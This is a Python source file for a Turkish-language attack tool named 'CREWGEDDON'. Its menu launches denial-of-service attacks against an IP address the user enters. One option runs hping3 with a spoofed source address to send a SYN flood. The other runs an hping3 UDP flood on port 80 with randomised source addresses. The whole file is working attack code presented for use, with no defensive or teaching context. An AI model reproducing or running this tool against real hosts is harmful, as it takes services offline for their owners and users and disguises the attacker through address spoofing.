from colorama import Fore
import time
import socket
import random
import os
import subprocess

def dosSystem():
      ip = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}IP Adresi: ")
      print(f"{Fore.YELLOW}[Duyuru]: {Fore.WHITE}FAKE IP Adresine random bir IP adresi belirtin.")    
      fakeIp = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Fake IP Adresi: ")
      if not ip:
            return print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}IP boş bırakılmaz..")
      elif not fakeIp:
            return print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Fake IP boş bırakılmaz..")
      elif fakeIp == ip:
            return print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Fake IP ile normal IP aynı olamaz.")
                        
      print(f"{Fore.YELLOW}[Duyuru]: {Fore.WHITE}Saldırıyı durdurmak için açılan pencereyi kapatmanız yeterli olacaktır.")
      print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Saldırı başlatılıyor..")
      time.sleep(2)
      subprocess.Popen([
            "xterm",
            "-T", "CREWGEDDON - DoS Saldırısı",
            "-hold",
            "-e",
            f"hping3 -S {ip} --spoof {fakeIp}"
      ])
      time.sleep(3)
      
      
def ddosSystem():
      ip = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}IP Adresi: ")
      
      port = 80
      if not ip:
            return print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}IP boş bırakılmaz..")
            
      print(f"{Fore.YELLOW}[Duyuru]: {Fore.WHITE}Saldırıyı durdurmak için açılan pencereyi kapatmanız yeterli olacaktır.")
      print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Saldırı başlatılıyor..")
      time.sleep(2)
      subprocess.Popen([
            "xterm",
            "-T", "CREWGEDDON - DDoS Saldırısı",
            "-hold",
            "-e",
            f"hping3 --udp {ip} -p {port} --flood --rand-source"
      ])
      time.sleep(3)
      
def secim():
      print(f"{Fore.YELLOW}[0] - {Fore.WHITE}Ana Menü")
      print(f"{Fore.YELLOW}[1] - {Fore.WHITE}Dos Saldırısı")
      print(f"{Fore.YELLOW}[2] - {Fore.WHITE}DDoS Saldırısı")
      secim = int(input(f'{Fore.WHITE}Seçim: '))
      
      if secim == 0:
            return secim
      elif secim == 1:
            dosSystem()
      elif secim == 2:
            ddosSystem()
      else:
            print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Geçersiz işlem belirtiniz.")
